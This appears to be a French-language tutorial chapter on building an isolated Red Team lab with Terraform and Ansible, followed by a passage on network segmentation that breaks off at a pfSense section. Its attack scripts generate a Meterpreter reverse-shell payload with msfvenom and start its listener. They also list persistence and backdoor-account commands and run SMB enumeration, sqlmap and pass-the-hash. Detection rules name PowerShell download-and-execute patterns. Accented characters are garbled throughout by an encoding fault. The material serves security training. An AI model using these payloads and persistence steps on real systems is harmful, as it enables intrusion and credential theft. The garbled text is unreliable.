Imaginez un laboratoire Red Team comme un **terrain d'entraÃ®nement militaire** : il reproduit fidÃ¨lement les conditions rÃ©elles de combat (environnement d'entreprise) tout en offrant un cadre sÃ©curisÃ© pour l'apprentissage et l'expÃ©rimentation. Chaque exercice peut Ãªtre rÃ©pÃ©tÃ©, analysÃ© et amÃ©liorÃ© sans consÃ©quences sur les opÃ©rations rÃ©elles.

### Topologie de laboratoire avancÃ©e

```
Laboratoire Red Team - Architecture complÃ¨te :

                    Internet SimulÃ©
                         â”‚
                    â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
                    â”‚ Firewallâ”‚ pfSense VM
                    â”‚ Gateway â”‚ (Edge Security)
                    â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜
                         â”‚
                    â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
                    â”‚   DMZ   â”‚ VLAN 30
                    â”‚         â”‚
              â”Œâ”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”
              â”‚                     â”‚
         â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”           â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
         â”‚Web Srv  â”‚           â”‚Mail Srv â”‚
         â”‚(Vuln)   â”‚           â”‚(Vuln)   â”‚
         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜           â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                         â”‚
                    â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
                    â”‚ Router  â”‚ Internal Gateway
                    â”‚ VLAN    â”‚
                    â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜
                         â”‚
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚                â”‚                â”‚
   â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
   â”‚ LAN 1   â”‚      â”‚ LAN 2   â”‚      â”‚ Server  â”‚
   â”‚ VLAN 10 â”‚      â”‚ VLAN 20 â”‚      â”‚ VLAN 40 â”‚
   â”‚         â”‚      â”‚         â”‚      â”‚         â”‚
   â”‚â”Œâ”€â”€â”€â”€â”€â”€â”€â”â”‚      â”‚â”Œâ”€â”€â”€â”€â”€â”€â”€â”â”‚      â”‚â”Œâ”€â”€â”€â”€â”€â”€â”€â”â”‚
   â”‚â”‚Win 10 â”‚â”‚      â”‚â”‚Win 11 â”‚â”‚      â”‚â”‚DC/DNS â”‚â”‚
   â”‚â”‚Client â”‚â”‚      â”‚â”‚Client â”‚â”‚      â”‚â”‚AD     â”‚â”‚
   â”‚â””â”€â”€â”€â”€â”€â”€â”€â”˜â”‚      â”‚â””â”€â”€â”€â”€â”€â”€â”€â”˜â”‚      â”‚â””â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
   â”‚â”Œâ”€â”€â”€â”€â”€â”€â”€â”â”‚      â”‚â”Œâ”€â”€â”€â”€â”€â”€â”€â”â”‚      â”‚â”Œâ”€â”€â”€â”€â”€â”€â”€â”â”‚
   â”‚â”‚Linux  â”‚â”‚      â”‚â”‚MacOS  â”‚â”‚      â”‚â”‚File   â”‚â”‚
   â”‚â”‚Workst â”‚â”‚      â”‚â”‚Client â”‚â”‚      â”‚â”‚Server â”‚â”‚
   â”‚â””â”€â”€â”€â”€â”€â”€â”€â”˜â”‚      â”‚â””â”€â”€â”€â”€â”€â”€â”€â”˜â”‚      â”‚â””â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                         â”‚
                    â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
                    â”‚ Mgmt    â”‚ VLAN 50
                    â”‚ Network â”‚
                    â”‚         â”‚
              â”Œâ”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”
              â”‚                     â”‚
         â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”           â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
         â”‚ SIEM    â”‚           â”‚ Backup  â”‚
         â”‚ ELK     â”‚           â”‚ Server  â”‚
         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜           â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Attacker Infrastructure (Isolated):
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Kali Linux VMs                          â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”‚
â”‚ â”‚ Kali 1  â”‚ â”‚ Kali 2  â”‚ â”‚ C2 Srv  â”‚     â”‚
â”‚ â”‚ Scanner â”‚ â”‚ Exploit â”‚ â”‚ Cobalt  â”‚     â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### CrÃ©ation automatisÃ©e avec Terraform

**Infrastructure Red Team complÃ¨te :**

```hcl
# redteam-lab.tf
variable "lab_name" {
  description = "Red Team lab identifier"
  type        = string
  default     = "redteam-lab-01"
}

variable "student_count" {
  description = "Number of student environments"
  type        = number
  default     = 5
}

# Network configuration
locals {
  networks = {
    dmz     = { vlan = 30, subnet = "192.168.30.0/24" }
    lan1    = { vlan = 10, subnet = "192.168.10.0/24" }
    lan2    = { vlan = 20, subnet = "192.168.20.0/24" }
    servers = { vlan = 40, subnet = "192.168.40.0/24" }
    mgmt    = { vlan = 50, subnet = "192.168.50.0/24" }
    attack  = { vlan = 60, subnet = "10.0.60.0/24" }
  }
}

# Vulnerable web server (DVWA)
resource "proxmox_vm_qemu" "dvwa_server" {
  count       = var.student_count
  name        = "${var.lab_name}-dvwa-${count.index + 1}"
  target_node = "proxmox${(count.index % 3) + 1}"
  
  clone      = "ubuntu-20.04-dvwa-template"
  full_clone = true
  
  cores  = 2
  memory = 2048
  
  disk {
    size    = "20G"
    storage = "local-lvm"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = local.networks.dmz.vlan
  }
  
  ipconfig0 = "ip=192.168.30.${10 + count.index}/24,gw=192.168.30.1"
  sshkeys   = file("~/.ssh/id_rsa.pub")
  
  tags = "${var.lab_name},vulnerable,web,dmz"
}

# Windows Domain Controller
resource "proxmox_vm_qemu" "domain_controller" {
  count       = var.student_count
  name        = "${var.lab_name}-dc-${count.index + 1}"
  target_node = "proxmox${(count.index % 3) + 1}"
  
  clone      = "windows-server-2019-template"
  full_clone = true
  
  cores  = 4
  memory = 4096
  
  disk {
    size    = "60G"
    storage = "ceph-storage"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = local.networks.servers.vlan
  }
  
  ipconfig0 = "ip=192.168.40.${10 + count.index}/24,gw=192.168.40.1"
  
  tags = "${var.lab_name},windows,domain-controller,target"
}

# Windows 10 clients (vulnerable)
resource "proxmox_vm_qemu" "windows_clients" {
  count       = var.student_count * 2  # 2 clients per lab
  name        = "${var.lab_name}-win10-${count.index + 1}"
  target_node = "proxmox${(count.index % 3) + 1}"
  
  clone      = "windows-10-vulnerable-template"
  full_clone = true
  
  cores  = 2
  memory = 4096
  
  disk {
    size    = "40G"
    storage = "local-lvm"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = count.index % 2 == 0 ? local.networks.lan1.vlan : local.networks.lan2.vlan
  }
  
  ipconfig0 = count.index % 2 == 0 ? 
    "ip=192.168.10.${20 + count.index}/24,gw=192.168.10.1" :
    "ip=192.168.20.${20 + count.index}/24,gw=192.168.20.1"
  
  tags = "${var.lab_name},windows,client,target"
}

# Kali Linux attacker machines
resource "proxmox_vm_qemu" "kali_attackers" {
  count       = var.student_count
  name        = "${var.lab_name}-kali-${count.index + 1}"
  target_node = "proxmox${(count.index % 3) + 1}"
  
  clone      = "kali-linux-2023-template"
  full_clone = true
  
  cores  = 4
  memory = 8192
  
  disk {
    size    = "80G"
    storage = "ceph-storage"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = local.networks.attack.vlan
  }
  
  ipconfig0 = "ip=10.0.60.${10 + count.index}/24,gw=10.0.60.1"
  sshkeys   = file("~/.ssh/id_rsa.pub")
  
  tags = "${var.lab_name},kali,attacker,isolated"
}

# pfSense firewall/router
resource "proxmox_vm_qemu" "pfsense_router" {
  count       = var.student_count
  name        = "${var.lab_name}-pfsense-${count.index + 1}"
  target_node = "proxmox${(count.index % 3) + 1}"
  
  clone      = "pfsense-2.7-template"
  full_clone = true
  
  cores  = 2
  memory = 2048
  
  disk {
    size    = "20G"
    storage = "local-lvm"
  }
  
  # WAN interface
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 1  # External network
  }
  
  # LAN interface (multiple VLANs)
  network {
    model  = "virtio"
    bridge = "vmbr0"
  }
  
  tags = "${var.lab_name},pfsense,firewall,router"
}

# SIEM/Monitoring (ELK Stack)
resource "proxmox_vm_qemu" "elk_siem" {
  count       = var.student_count
  name        = "${var.lab_name}-elk-${count.index + 1}"
  target_node = "proxmox${(count.index % 3) + 1}"
  
  clone      = "ubuntu-22.04-elk-template"
  full_clone = true
  
  cores  = 6
  memory = 12288
  
  disk {
    size    = "100G"
    storage = "ceph-storage"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = local.networks.mgmt.vlan
  }
  
  ipconfig0 = "ip=192.168.50.${10 + count.index}/24,gw=192.168.50.1"
  sshkeys   = file("~/.ssh/id_rsa.pub")
  
  tags = "${var.lab_name},elk,siem,monitoring"
}

# Outputs for lab access
output "lab_environments" {
  value = {
    for i in range(var.student_count) : "lab-${i + 1}" => {
      dvwa_ip    = proxmox_vm_qemu.dvwa_server[i].default_ipv4_address
      dc_ip      = proxmox_vm_qemu.domain_controller[i].default_ipv4_address
      kali_ip    = proxmox_vm_qemu.kali_attackers[i].default_ipv4_address
      elk_ip     = proxmox_vm_qemu.elk_siem[i].default_ipv4_address
      pfsense_ip = proxmox_vm_qemu.pfsense_router[i].default_ipv4_address
    }
  }
}
```

### Configuration automatisÃ©e avec Ansible

**Playbook de configuration Red Team :**

```yaml
# playbooks/redteam-setup.yml
---
- name: Configure Red Team Lab Environment
  hosts: all
  become: yes
  vars:
    lab_domain: "redteam.local"
    
  tasks:
    - name: Update system packages
      apt:
        update_cache: yes
        upgrade: dist
      when: ansible_os_family == "Debian"

- name: Configure Vulnerable Web Server (DVWA)
  hosts: dvwa_servers
  become: yes
  tasks:
    - name: Install LAMP stack
      apt:
        name:
          - apache2
          - mysql-server
          - php
          - php-mysql
          - php-gd
          - git
        state: present
        
    - name: Clone DVWA repository
      git:
        repo: https://github.com/digininja/DVWA.git
        dest: /var/www/html/dvwa
        
    - name: Configure DVWA database
      mysql_db:
        name: dvwa
        state: present
        
    - name: Create DVWA database user
      mysql_user:
        name: dvwa
        password: "password"
        priv: "dvwa.*:ALL"
        state: present
        
    - name: Configure DVWA settings
      copy:
        content: |
          <?php
          $_DVWA = array();
          $_DVWA[ 'db_server' ]   = '127.0.0.1';
          $_DVWA[ 'db_database' ] = 'dvwa';
          $_DVWA[ 'db_user' ]     = 'dvwa';
          $_DVWA[ 'db_password' ] = 'password';
          $_DVWA[ 'recaptcha_public_key' ]  = '';
          $_DVWA[ 'recaptcha_private_key' ] = '';
          $_DVWA[ 'default_security_level' ] = 'low';
          $_DVWA[ 'default_phpids_level' ] = 'off';
          $_DVWA[ 'default_dvwaSecurityLevel' ] = 'low';
          ?>
        dest: /var/www/html/dvwa/config/config.inc.php
        
    - name: Set vulnerable permissions
      file:
        path: /var/www/html/dvwa
        owner: www-data
        group: www-data
        mode: '0777'
        recurse: yes

- name: Configure Kali Linux Attackers
  hosts: kali_attackers
  become: yes
  tasks:
    - name: Update Kali repositories
      apt:
        update_cache: yes
        
    - name: Install additional tools
      apt:
        name:
          - metasploit-framework
          - empire
          - cobalt-strike  # Si licence disponible
          - bloodhound
          - neo4j
          - crackmapexec
          - impacket-scripts
          - responder
        state: present
        
    - name: Configure Metasploit database
      shell: |
        systemctl start postgresql
        systemctl enable postgresql
        msfdb init
        
    - name: Setup Cobalt Strike (if available)
      copy:
        src: /opt/cobaltstrike/
        dest: /opt/cobaltstrike/
        mode: '0755'
      when: cobaltstrike_available | default(false)
      
    - name: Create attack scripts directory
      file:
        path: /opt/attack-scripts
        state: directory
        mode: '0755'
        
    - name: Deploy custom attack scripts
      template:
        src: "{{ item }}.j2"
        dest: "/opt/attack-scripts/{{ item }}"
        mode: '0755'
      loop:
        - network-scan.sh
        - domain-enum.sh
        - lateral-movement.sh

- name: Configure ELK SIEM
  hosts: elk_servers
  become: yes
  tasks:
    - name: Install Java
      apt:
        name: openjdk-11-jdk
        state: present
        
    - name: Add Elastic repository
      apt_key:
        url: https://artifacts.elastic.co/GPG-KEY-elasticsearch
        state: present
        
    - name: Add Elastic APT repository
      apt_repository:
        repo: "deb https://artifacts.elastic.co/packages/8.x/apt stable main"
        state: present
        
    - name: Install ELK stack
      apt:
        name:
          - elasticsearch
          - logstash
          - kibana
          - filebeat
        state: present
        
    - name: Configure Elasticsearch
      template:
        src: elasticsearch.yml.j2
        dest: /etc/elasticsearch/elasticsearch.yml
      notify: restart elasticsearch
      
    - name: Configure Kibana
      template:
        src: kibana.yml.j2
        dest: /etc/kibana/kibana.yml
      notify: restart kibana
      
    - name: Configure Logstash for security logs
      copy:
        content: |
          input {
            beats {
              port => 5044
            }
            syslog {
              port => 514
            }
          }
          
          filter {
            if [fields][log_type] == "windows" {
              mutate {
                add_tag => ["windows"]
              }
            }
            
            if [fields][log_type] == "linux" {
              mutate {
                add_tag => ["linux"]
              }
            }
          }
          
          output {
            elasticsearch {
              hosts => ["localhost:9200"]
              index => "security-logs-%{+YYYY.MM.dd}"
            }
          }
        dest: /etc/logstash/conf.d/security.conf
      notify: restart logstash

  handlers:
    - name: restart elasticsearch
      systemd:
        name: elasticsearch
        state: restarted
        enabled: yes
        
    - name: restart kibana
      systemd:
        name: kibana
        state: restarted
        enabled: yes
        
    - name: restart logstash
      systemd:
        name: logstash
        state: restarted
        enabled: yes
```

### ScÃ©narios d'attaque automatisÃ©s

**Scripts d'entraÃ®nement progressif :**

```bash
#!/bin/bash
# attack-scenarios/scenario-1-recon.sh

LAB_ID=$1
TARGET_NETWORK="192.168.10.0/24"
DVWA_IP="192.168.30.10"

echo "=== Red Team Scenario 1: Reconnaissance ==="
echo "Lab ID: $LAB_ID"
echo "Target Network: $TARGET_NETWORK"

# Phase 1: Network Discovery
echo "[+] Phase 1: Network Discovery"
nmap -sn $TARGET_NETWORK | tee /tmp/live-hosts.txt

# Phase 2: Port Scanning
echo "[+] Phase 2: Port Scanning"
for ip in $(grep -oP '\d+\.\d+\.\d+\.\d+' /tmp/live-hosts.txt); do
    echo "Scanning $ip..."
    nmap -sS -sV -O $ip -oN /tmp/scan-$ip.txt
done

# Phase 3: Service Enumeration
echo "[+] Phase 3: Service Enumeration"
# Web services
echo "Checking web services..."
for ip in $(grep -l "80/tcp\|443/tcp" /tmp/scan-*.txt | cut -d'-' -f2 | cut -d'.' -f1-4); do
    nikto -h $ip -o /tmp/nikto-$ip.txt
    dirb http://$ip /usr/share/dirb/wordlists/common.txt -o /tmp/dirb-$ip.txt
done

# SMB enumeration
echo "Enumerating SMB shares..."
for ip in $(grep -l "445/tcp" /tmp/scan-*.txt | cut -d'-' -f2 | cut -d'.' -f1-4); do
    enum4linux $ip > /tmp/smb-enum-$ip.txt
    smbclient -L $ip -N >> /tmp/smb-enum-$ip.txt
done

# Phase 4: Vulnerability Assessment
echo "[+] Phase 4: Vulnerability Assessment"
# DVWA specific tests
if curl -s http://$DVWA_IP/dvwa/ | grep -q "DVWA"; then
    echo "DVWA detected at $DVWA_IP"
    # SQL Injection test
    sqlmap -u "http://$DVWA_IP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
           --cookie="PHPSESSID=...; security=low" \
           --batch --dbs
fi

echo "=== Reconnaissance Complete ==="
echo "Results saved in /tmp/"
```

**ScÃ©nario d'attaque avancÃ© :**

```python
#!/usr/bin/env python3
# attack-scenarios/advanced-apt-simulation.py

import subprocess
import time
import requests
import json
from datetime import datetime

class APTSimulation:
    def __init__(self, lab_id, target_domain="redteam.local"):
        self.lab_id = lab_id
        self.target_domain = target_domain
        self.log_file = f"/tmp/apt-simulation-{lab_id}.log"
        
    def log(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.log_file, "a") as f:
            f.write(f"[{timestamp}] {message}\n")
        print(f"[{timestamp}] {message}")
        
    def phase1_initial_access(self):
        """Simulate spear phishing and initial compromise"""
        self.log("=== Phase 1: Initial Access ===")
        
        # Simulate email reconnaissance
        self.log("Gathering email addresses from target domain")
        subprocess.run([
            "theHarvester", "-d", self.target_domain, 
            "-b", "google,bing,linkedin", "-f", f"/tmp/emails-{self.lab_id}.xml"
        ])
        
        # Generate phishing payload
        self.log("Generating phishing payload with msfvenom")
        subprocess.run([
            "msfvenom", "-p", "windows/meterpreter/reverse_tcp",
            "LHOST=10.0.60.10", "LPORT=4444",
            "-f", "exe", "-o", f"/tmp/payload-{self.lab_id}.exe"
        ])
        
        # Start listener
        self.log("Starting Metasploit listener")
        meterpreter_rc = f"""
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.0.60.10
set LPORT 4444
exploit -j
"""
        with open(f"/tmp/listener-{self.lab_id}.rc", "w") as f:
            f.write(meterpreter_rc)
            
        subprocess.Popen([
            "msfconsole", "-r", f"/tmp/listener-{self.lab_id}.rc"
        ])
        
    def phase2_persistence(self):
        """Establish persistence mechanisms"""
        self.log("=== Phase 2: Persistence ===")
        
        # Registry persistence
        persistence_commands = [
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityUpdate /t REG_SZ /d C:\\Windows\\Temp\\update.exe",
            "schtasks /create /tn 'Windows Security Update' /tr C:\\Windows\\Temp\\update.exe /sc onlogon",
            "net user backdoor P@ssw0rd123 /add",
            "net localgroup administrators backdoor /add"
        ]
        
        for cmd in persistence_commands:
            self.log(f"Executing: {cmd}")
            
    def phase3_privilege_escalation(self):
        """Escalate privileges using various techniques"""
        self.log("=== Phase 3: Privilege Escalation ===")
        
        # Check for common privilege escalation vectors
        privesc_checks = [
            "whoami /priv",
            "systeminfo | findstr /B /C:'OS Name' /C:'OS Version'",
            "wmic qfe list",
            "net users",
            "net localgroup administrators"
        ]
        
        for check in privesc_checks:
            self.log(f"Running: {check}")
            
        # Attempt UAC bypass
        self.log("Attempting UAC bypass")
        
    def phase4_lateral_movement(self):
        """Move laterally through the network"""
        self.log("=== Phase 4: Lateral Movement ===")
        
        # Network discovery
        self.log("Discovering network topology")
        subprocess.run([
            "crackmapexec", "smb", "192.168.40.0/24",
            "--shares", "-u", "backdoor", "-p", "P@ssw0rd123"
        ])
        
        # Pass-the-hash attacks
        self.log("Attempting pass-the-hash attacks")
        subprocess.run([
            "impacket-psexec", "redteam.local/backdoor@192.168.40.10",
            "-hashes", ":aad3b435b51404eeaad3b435b51404ee"
        ])
        
    def phase5_data_exfiltration(self):
        """Simulate data exfiltration"""
        self.log("=== Phase 5: Data Exfiltration ===")
        
        # Search for sensitive files
        search_commands = [
            "dir C:\\Users\\*\\Documents\\*.pdf /s",
            "dir C:\\Users\\*\\Desktop\\*.xlsx /s",
            "findstr /si password *.txt *.ini *.cfg"
        ]
        
        for cmd in search_commands:
            self.log(f"Searching: {cmd}")
            
        # Simulate data staging and exfiltration
        self.log("Staging sensitive data")
        self.log("Exfiltrating data via DNS tunneling")
        
    def run_simulation(self):
        """Execute complete APT simulation"""
        self.log(f"Starting APT simulation for lab {self.lab_id}")
        
        self.phase1_initial_access()
        time.sleep(30)  # Wait for initial access
        
        self.phase2_persistence()
        time.sleep(15)
        
        self.phase3_privilege_escalation()
        time.sleep(20)
        
        self.phase4_lateral_movement()
        time.sleep(25)
        
        self.phase5_data_exfiltration()
        
        self.log("APT simulation completed")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 advanced-apt-simulation.py <lab_id>")
        sys.exit(1)
        
    lab_id = sys.argv[1]
    apt_sim = APTSimulation(lab_id)
    apt_sim.run_simulation()
```

### Monitoring et dÃ©tection Blue Team

**Configuration de dÃ©tection automatisÃ©e :**

```yaml
# detection-rules.yml
detection_rules:
  - name: "Suspicious PowerShell Activity"
    query: |
      event.code:4103 AND 
      (powershell.command_line:*DownloadString* OR 
       powershell.command_line:*IEX* OR 
       powershell.command_line:*Invoke-Expression*)
    severity: "high"
    
  - name: "Lateral Movement via SMB"
    query: |
      event.code:4624 AND 
      winlog.logon.type:3 AND 
      source.ip:(192.168.10.* OR 192.168.20.* OR 192.168.40.*)
    severity: "medium"
    
  - name: "Privilege Escalation Attempt"
    query: |
      event.code:4672 AND 
      winlog.event_data.PrivilegeList:*SeDebugPrivilege*
    severity: "high"
    
  - name: "Suspicious Network Scanning"
    query: |
      network.protocol:tcp AND 
      destination.port:(22 OR 23 OR 135 OR 139 OR 445 OR 3389) AND 
      source.packets:>100
    severity: "medium"
```

### Gestion et rÃ©initialisation des labs

**Scripts de gestion automatisÃ©e :**

```bash
#!/bin/bash
# lab-management/reset-lab.sh

LAB_ID=$1
if [ -z "$LAB_ID" ]; then
    echo "Usage: $0 <lab_id>"
    exit 1
fi

echo "Resetting Red Team Lab $LAB_ID..."

# Stop all VMs in the lab
for vm in $(qm list | grep "redteam-lab-$LAB_ID" | awk '{print $1}'); do
    echo "Stopping VM $vm..."
    qm stop $vm
done

# Revert to clean snapshots
for vm in $(qm list | grep "redteam-lab-$LAB_ID" | awk '{print $1}'); do
    echo "Reverting VM $vm to clean snapshot..."
    qm rollback $vm clean-state
done

# Start VMs in correct order
echo "Starting infrastructure VMs..."
qm start $(qm list | grep "redteam-lab-$LAB_ID-pfsense" | awk '{print $1}')
sleep 30

qm start $(qm list | grep "redteam-lab-$LAB_ID-dc" | awk '{print $1}')
sleep 60

# Start remaining VMs
for vm in $(qm list | grep "redteam-lab-$LAB_ID" | grep -v "pfsense\|dc" | awk '{print $1}'); do
    echo "Starting VM $vm..."
    qm start $vm
    sleep 10
done

echo "Lab $LAB_ID reset complete!"
echo "Access details:"
echo "- Kali Linux: ssh kali@10.0.60.$((10 + LAB_ID))"
echo "- DVWA: http://192.168.30.$((10 + LAB_ID))/dvwa/"
echo "- ELK: http://192.168.50.$((10 + LAB_ID)):5601"
```

### Cas d'usage spÃ©cialisÃ©s

**Formation certifiante :** CrÃ©ez des environnements standardisÃ©s pour les certifications OSCP, CISSP, ou CEH avec des challenges progressifs et un systÃ¨me de scoring automatique.

**Red Team professionnel :** DÃ©ployez des rÃ©pliques d'infrastructures client pour les tests de pÃ©nÃ©tration, avec des configurations personnalisÃ©es et des donnÃ©es rÃ©alistes mais anonymisÃ©es.

**Recherche en sÃ©curitÃ© :** Utilisez des environnements isolÃ©s pour tester de nouvelles techniques d'attaque, dÃ©velopper des outils de sÃ©curitÃ©, et analyser des malwares en toute sÃ©curitÃ©.

---

## 7.2 Segmentation rÃ©seau

### Principes de la segmentation rÃ©seau

La **segmentation rÃ©seau** divise une infrastructure en zones de sÃ©curitÃ© distinctes, limitant la propagation des attaques et rÃ©duisant la surface d'exposition. Cette approche dÃ©fensive transforme un rÃ©seau plat vulnÃ©rable en architecture multicouche oÃ¹ chaque segment a des politiques de sÃ©curitÃ© spÃ©cifiques.

Imaginez la segmentation comme les **cloisons Ã©tanches d'un navire** : si une section est compromise (brÃ¨che), les autres compartiments restent protÃ©gÃ©s, empÃªchant le navire de couler entiÃ¨rement. Chaque segment rÃ©seau fonctionne indÃ©pendamment avec ses propres contrÃ´les d'accÃ¨s et mÃ©canismes de surveillance.

### Architecture de segmentation multicouche

```
Segmentation RÃ©seau Enterprise :

                    Internet
                        â”‚
                   â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
                   â”‚ Firewallâ”‚ Next-Gen Firewall
                   â”‚ Perimeterâ”‚ (IPS/IDS intÃ©grÃ©)
                   â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜
                        â”‚
                   â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
                   â”‚   DMZ   â”‚ VLAN 100 (192.168.100.0/24)
                   â”‚         â”‚ Zone dÃ©militarisÃ©e
              â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”
              â”‚                   â”‚
         â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
         â”‚Web Srv  â”‚         â”‚Mail Srv â”‚
         â”‚Public   â”‚         â”‚Relay    â”‚
         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                        â”‚
                   â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
                   â”‚Internal â”‚ Firewall interne
                   â”‚Firewall â”‚ (Micro-segmentation)
                   â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜
                        â”‚
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚               â”‚               â”‚
   â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
   â”‚ Users   â”‚     â”‚Servers  â”‚     â”‚ Admin   â”‚
   â”‚VLAN 10  â”‚     â”‚VLAN 20  â”‚     â”‚VLAN 30  â”‚
   â”‚Trust:Lowâ”‚     â”‚Trust:Medâ”‚     â”‚Trust:Highâ”‚
   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
        â”‚               â”‚               â”‚
   â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
   â”‚Endpointsâ”‚     â”‚App Srv  â”‚     â”‚Domain   â”‚
   â”‚Clients  â”‚     â”‚Database â”‚     â”‚Controllersâ”‚
   â”‚BYOD     â”‚     â”‚File Srv â”‚     â”‚Backup   â”‚
   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Zones de confiance :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Zone        â”‚ Trust Level â”‚ Access      â”‚ Monitoring  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Internet    â”‚ Untrusted   â”‚ Denied      â”‚ Full        â”‚
â”‚ DMZ         â”‚ Low         â”‚ Restricted  â”‚ Enhanced    â”‚
â”‚ Users       â”‚ Medium      â”‚ Controlled  â”‚ Standard    â”‚
â”‚ Servers     â”‚ High        â”‚ Managed     â”‚ Detailed    â”‚
â”‚ Admin       â”‚ Critical    â”‚ Privileged  â”‚ Intensive   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### ImplÃ©mentation avec pfSense

**Configuration pfSense pour micro-segmentation :**

```bash
# Configuration via CLI pfSense
# /conf/config.xml

